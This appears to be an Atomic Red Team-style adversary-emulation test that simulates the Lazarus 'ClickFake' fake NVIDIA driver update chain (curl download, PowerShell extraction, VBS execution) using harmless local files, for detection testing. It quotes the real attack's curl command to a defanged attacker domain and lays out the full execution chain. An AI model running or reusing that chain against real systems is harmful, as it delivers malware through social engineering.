@@ -1,0 +1,189 @@
+attack_technique: T1566.002
+display_name: BYOVD - Fake Driver Update Social Engineering
+atomic_tests:
+- name: Simulate Lazarus ClickFake Driver Update Campaign
+  auto_generated_guid: b4c5d6e7-f8a9-0123-4567-890abcdef123
+  description: |
+    Simulates the Lazarus Group ClickFake campaign delivery mechanism using fake driver updates.
+    Recreates the curl + PowerShell + VBS execution chain observed in real attacks.
+    Based on command: curl -k -o "%TEMP%\nvidiadrivers.zip" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update
+    This test is safe and uses only local files for simulation.
+  supported_platforms:
+  - windows
+  input_arguments:
+    fake_driver_url:
+      description: Simulated malicious driver download URL (local file for safety)
+      type: string
+      default: file:///C:/temp/test_nvidiadrivers.zip
+    driver_archive_name:
+      description: Name of the fake driver archive
+      type: string
+      default: nvidiadrivers.zip
+    temp_extraction_path:
+      description: Temporary extraction path for simulation
+      type: string
+      default: "%TEMP%\nvidiadrivers"
+    vbs_script_name:
+      description: Name of the VBS script to execute
+      type: string
+      default: update.vbs
+    simulation_mode:
+      description: Run in safe simulation mode
+      type: boolean
+      default: true
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Create test driver archive for simulation
+    prereq_command: |
+      Test-Path "C:\temp\test_nvidiadrivers.zip"
+    get_prereq_command: |
+      # Create safe test environment
+      New-Item -Path "C:\temp" -ItemType Directory -Force -ErrorAction SilentlyContinue
+      
+      # Create test VBS script (harmless)
+      $testVBS = @'
+      ' BYOVD Test VBS Script - Harmless Simulation
+      Dim objShell
+      Set objShell = CreateObject("WScript.Shell")
+      objShell.Run "cmd.exe /c echo BYOVD Social Engineering Test - VBS Execution Simulated", 0, True
+      WScript.Echo "Fake driver update simulation completed"
+      '@
+      
+      # Create temporary directory structure
+      $tempDir = "$env:TEMP\nvidiadrivers_prep"
+      New-Item -Path $tempDir -ItemType Directory -Force
+      $testVBS | Out-File -FilePath "$tempDir\update.vbs" -Encoding ASCII
+      
+      # Create additional fake driver files
+      "Fake NVIDIA driver installer" | Out-File -FilePath "$tempDir\nvinstall.exe" -Encoding ASCII
+      "Fake driver configuration" | Out-File -FilePath "$tempDir\config.ini" -Encoding ASCII
+      
+      # Create ZIP archive
+      Compress-Archive -Path "$tempDir\*" -DestinationPath "C:\temp\test_nvidiadrivers.zip" -Force
+      
+      # Cleanup preparation directory
+      Remove-Item $tempDir -Recurse -Force
+      
+      Write-Host "Test driver archive created: C:\temp\test_nvidiadrivers.zip"
+  - description: Curl should be available for download simulation
+    prereq_command: |
+      Get-Command curl.exe -ErrorAction SilentlyContinue
+    get_prereq_command: |
+      Write-Host "curl.exe should be available in Windows 10/11 by default"
+      Write-Host "If not available, install via Windows features or use PowerShell alternatives"
+  executor:
+    command: |
+      if ("#{simulation_mode}" -eq "true") {
+        Write-Host "=== BYOVD Fake Driver Update Social Engineering Simulation ==="
+        Write-Host "Simulating Lazarus Group ClickFake campaign delivery mechanism"
+        Write-Host ""
+        
+        # Step 1: Simulate malicious driver download
+        Write-Host "[1] Simulating Driver Download Phase:"
+        Write-Host "Original command: curl -k -o `"%TEMP%\nvidiadrivers.zip`" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update"
+        Write-Host "Safe simulation: Using local test file"
+        
+        # Use PowerShell instead of curl for local file copy simulation
+        $sourceFile = "C:\temp\test_nvidiadrivers.zip"
+        $targetFile = "$env:TEMP\#{driver_archive_name}"
+        
+        if (Test-Path $sourceFile) {
+          Copy-Item $sourceFile $targetFile -Force
+          Write-Host "✓ Fake driver archive 'downloaded': $targetFile"
+          
+          # Log the download simulation
+          $logMessage = "BYOVD Test: Simulated malicious driver download - $targetFile"
+          try {
+            New-EventLog -LogName Application -Source "BYOVD-Test" -ErrorAction SilentlyContinue
+          } catch {}
+          Write-EventLog -LogName Application -Source "BYOVD-Test" -EventId 2001 -EntryType Information -Message $logMessage
+        } else {
+          Write-Host "✗ Test archive not found - run prerequisite commands"
+          exit 1
+        }
+        
+        # Step 2: Simulate PowerShell archive extraction
+        Write-Host ""
+        Write-Host "[2] Simulating PowerShell Archive Extraction:"
+        Write-Host "Original command: powershell -Command `"Expand-Archive -Force -Path '%TEMP%\nvidiadrivers.zip' -DestinationPath '%TEMP%\nvidiadrivers'`""
+        
+        $extractPath = "#{temp_extraction_path}".Replace("%TEMP%", $env:TEMP)
+        try {
+          Expand-Archive -Force -Path $targetFile -DestinationPath $extractPath
+          Write-Host "✓ Archive extracted to: $extractPath"
+          
+          # List extracted contents
+          $extractedFiles = Get-ChildItem $extractPath
+          Write-Host "Extracted files:"
+          $extractedFiles | ForEach-Object { Write-Host "  - $($_.Name)" }
+          
+        } catch {
+          Write-Host "✗ Archive extraction failed: $($_.Exception.Message)"
+          exit 1
+        }
+        
+        # Step 3: Simulate VBS script execution
+        Write-Host ""
+        Write-Host "[3] Simulating VBS Script Execution:"
+        Write-Host "Original command: wscript `"%TEMP%\nvidiadrivers\update.vbs`""
+        
+        $vbsPath = Join-Path $extractPath "#{vbs_script_name}"
+        if (Test-Path $vbsPath) {
+          Write-Host "Executing VBS script: $vbsPath"
+          
+          # Execute the harmless VBS script
+          Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -Wait -WindowStyle Hidden
+          Write-Host "✓ VBS script execution completed"
+          
+          # Log the VBS execution
+          $vbsLogMessage = "BYOVD Test: Simulated VBS execution - $vbsPath"
+          Write-EventLog -LogName Application -Source "BYOVD-Test" -EventId 2002 -EntryType Warning -Message $vbsLogMessage
+          
+        } else {
+          Write-Host "✗ VBS script not found: $vbsPath"
+        }
+        
+        # Step 4: Simulate post-execution activities
+        Write-Host ""
+        Write-Host "[4] Simulating Post-Execution Activities:"
+        Write-Host "  - Driver installation preparation"
+        Write-Host "  - System reconnaissance"
+        Write-Host "  - Persistence mechanism deployment"
+        Write-Host "  - Anti-analysis evasion"
+        
+        Write-Host ""
+        Write-Host "=== Social Engineering Simulation Summary ==="
+        Write-Host "Technique: T1566.002 - Phishing: Spearphishing Link"
+        Write-Host "Campaign: Lazarus Group ClickFake"
+        Write-Host "Attack Chain: curl → PowerShell → VBS execution"
+        Write-Host "Status: Complete simulation (no actual malware executed)"
+        Write-Host "Detection: Monitor for driver-themed downloads and multi-stage execution"
+        
+      } else {
+        Write-Host "ERROR: Non-simulation mode disabled for safety"
+        Write-Host "This test only operates in simulation mode"
+      }
+    cleanup_command: |
+      # Remove simulation artifacts
+      $targetFile = "$env:TEMP\#{driver_archive_name}"
+      $extractPath = "#{temp_extraction_path}".Replace("%TEMP%", $env:TEMP)
+      
+      if (Test-Path $targetFile) {
+        Remove-Item $targetFile -Force
+        Write-Host "Removed fake driver archive: $targetFile"
+      }
+      
+      if (Test-Path $extractPath) {
+        Remove-Item $extractPath -Recurse -Force
+        Write-Host "Removed extraction directory: $extractPath"
+      }
+      
+      # Clean up test files
+      if (Test-Path "C:\temp\test_nvidiadrivers.zip") {
+        Remove-Item "C:\temp\test_nvidiadrivers.zip" -Force
+        Write-Host "Removed test archive: C:\temp\test_nvidiadrivers.zip"
+      }
+      
+      Write-Host "Social engineering simulation cleanup completed"
+    name: powershell
+    elevation_required: false
